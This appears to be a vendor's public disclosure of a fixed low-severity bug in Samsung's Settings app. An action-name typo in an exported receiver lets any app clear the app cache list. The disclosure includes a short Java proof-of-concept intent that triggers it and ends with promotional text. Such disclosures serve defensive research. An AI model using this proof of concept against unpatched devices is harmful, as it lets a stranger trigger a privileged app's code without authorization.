# Details

<table>
    <tr>
        <td>Name</td>
        <td>Settings</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.settings</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.13</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured found a typo in the Settings app related to the action name. The app contains the following receiver:
```xml
<receiver android:name="com.samsung.android.settings.applications.cachedb.AppListCacheReceiver" android:exported="true" android:process=":remote">
    <intent-filter>
        <action android:name="com.samsung.android.settings.intent.action.LOCALE_CHANGE" />
```

The `com.samsung.android.settings.intent.action.LOCALE_CHANGE` action is declared as `protected-broadcast`, so the attacker cannot send the intent with it. However, due to a typo inside the receiver, the file `com/samsung/android/settings/applications/cachedb/AppListCacheReceiver.java` has an action comparison with the value `com.samsung.android.settings.intent.action.LOCALE_CHANGED`. Internally, the receiver clears the app cache list. Because of this, an attacker can bypass this condition by using an explicit intent with this action and reach the execution of dangerous code.

**Proof of Concept**

```java
Intent i = new Intent("com.samsung.android.settings.intent.action.LOCALE_CHANGED");
i.setClassName("com.android.settings", "com.samsung.android.settings.applications.cachedb.AppListCacheReceiver");
sendBroadcast(i);
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.